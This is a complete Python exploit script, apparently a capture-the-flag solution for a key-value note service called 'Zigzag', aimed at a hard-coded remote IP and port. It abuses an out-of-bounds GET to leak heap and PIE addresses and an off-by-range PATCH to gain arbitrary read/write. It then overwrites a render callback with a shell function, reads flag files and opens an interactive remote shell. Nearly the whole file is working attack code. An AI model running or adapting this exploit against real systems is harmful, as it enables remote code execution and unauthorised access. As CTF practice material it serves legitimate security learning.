#!/usr/bin/env python3
import os
import select
import socket
import struct
import subprocess
import sys


HOST = "154.57.164.73"
PORT = 32418

RENDER_OFF = 0x14F30
SHELL_OFF = 0x6B820


def p64(x):
    return struct.pack("<Q", x)


def u64(x):
    return struct.unpack("<Q", x)[0]


class Tube:
    def __init__(self, local=False):
        if local:
            self.proc = subprocess.Popen(
                ["Zigzag/zigzag"], stdin=subprocess.PIPE, stdout=subprocess.PIPE
            )
            self.reader, self.writer = self.proc.stdout, self.proc.stdin
        else:
            self.proc = None
            self.sock = socket.create_connection((HOST, PORT))
            self.reader = self.writer = self.sock
        self.buf = b""

    def send(self, data):
        self.writer.sendall(data) if self.proc is None else self.writer.write(data)
        if self.proc is not None:
            self.writer.flush()

    def sendline(self, data):
        self.send(data + b"\n")

    def _read(self, n=4096):
        return os.read(self.reader.fileno(), n)

    def recvn(self, n):
        while len(self.buf) < n:
            chunk = self._read()
            if not chunk:
                raise EOFError("connection closed")
            self.buf += chunk
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def recvuntil(self, marker):
        while marker not in self.buf:
            chunk = self._read()
            if not chunk:
                raise EOFError("connection closed")
            self.buf += chunk
        end = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:end], self.buf[end:]
        return out

    def interactive(self):
        if self.buf:
            os.write(1, self.buf)
            self.buf = b""
        inputs = [self.reader, sys.stdin]
        while True:
            ready, _, _ = select.select(inputs, [], [])
            if self.reader in ready:
                data = self._read()
                if not data:
                    return
                os.write(1, data)
            if sys.stdin in ready:
                data = os.read(0, 4096)
                if not data:
                    inputs.remove(sys.stdin)
                else:
                    self.send(data)


def put(io, key, data):
    io.send(f"PUT {key} {len(data)}\n".encode() + data)
    io.recvuntil(b"OK\n")


def get(io, key, size):
    io.sendline(f"GET {key} {size}".encode())
    io.recvuntil(b"VALUE ")
    value = io.recvn(size)
    io.recvn(1)  # newline
    return value


def patch(io, key, data):
    io.send(f"PATCH {key} {len(data)}\n".encode() + data)
    io.recvuntil(b"OK\n")


def exploit(io):
    io.recvuntil(b"session open\n")

    # 24-byte data buffers and 24-byte Note records share an allocator size
    # class.  The resulting layout is D0, R0, D1, R1 in 0x20-byte slots.
    put(io, 0, b"A" * 24)
    put(io, 1, b"B" * 24)

    # GET permits 48 bytes.  For D0 this reaches R0's pointer and length,
    # but stops immediately before R0's callback.
    leak = get(io, 0, 48)
    data0 = u64(leak[32:40])
    data1 = data0 + 0x40
    record1_callback = data1 + 0x30

    # The matching PATCH off-by-range lets us replace R0's pointer and
    # length, turning note 0 into an arbitrary 8-byte read/write primitive.
    patch(io, 0, b"C" * 32 + p64(record1_callback) + p64(8))

    render = u64(get(io, 0, 8))
    pie = render - RENDER_OFF
    shell = pie + SHELL_OFF
    print(f"[+] data0 = {data0:#x}", file=sys.stderr)
    print(f"[+] PIE   = {pie:#x}", file=sys.stderr)
    print(f"[+] shell = {shell:#x}", file=sys.stderr)

    patch(io, 0, p64(shell))
    io.sendline(b"RENDER 1")
    io.sendline(b"cat flag* /flag* 2>/dev/null")
    io.interactive()


if __name__ == "__main__":
    tube = Tube(local="LOCAL" in sys.argv[1:])
    exploit(tube)
